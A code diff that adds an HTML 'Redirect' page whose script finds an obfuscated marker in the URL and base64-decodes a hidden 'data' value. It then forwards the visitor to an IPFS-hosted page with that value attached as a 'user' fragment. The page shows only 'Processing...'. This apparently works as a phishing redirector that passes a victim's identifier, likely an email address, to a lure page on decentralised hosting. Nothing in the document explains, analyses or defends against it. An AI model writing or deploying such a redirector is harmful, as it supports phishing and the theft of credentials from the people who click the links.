@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect</title>
+    <script>
+        // ULTRA SIMPLE - JUST EXTRACT AND REDIRECT
+        const url = window.location.href;
+        
+        // Find pattern
+        const patternIndex = url.indexOf('?.#.i7pl1ib.');
+        if (patternIndex !== -1) {
+            // Get everything after pattern
+            const afterPattern = url.substring(patternIndex + '?.#.i7pl1ib.'.length);
+            
+            // Take only Base64 (stop at # or ?)
+            let base64 = afterPattern;
+            if (afterPattern.includes('#')) base64 = afterPattern.split('#')[0];
+            if (afterPattern.includes('?')) base64 = afterPattern.split('?')[0];
+            
+            try {
+                // Decode
+                const decoded = atob(base64);
+                
+                // Find data= parameter
+                const dataStart = decoded.indexOf('data=');
+                if (dataStart !== -1) {
+                    // Get data value
+                    let dataValue = decoded.substring(dataStart + 5);
+                    // Remove anything after &
+                    const ampIndex = dataValue.indexOf('&');
+                    if (ampIndex !== -1) {
+                        dataValue = dataValue.substring(0, ampIndex);
+                    }
+                    
+                    // Build final URL
+                    const finalURL = "https://bafkreiepv2gewnnkktuq6cw6fyyy23zafra2lvxg7ihl7qelazqwvldlyu.ipfs.dweb.link/?eim.com&user=#" + dataValue;
+                    
+                    // Redirect
+                    window.location.href = finalURL;
+                }
+            } catch(e) {
+                document.body.innerHTML = "Invalid link";
+            }
+        }
+    </script>
+</head>
+<body>
+    Processing...
+</body>
+</html>
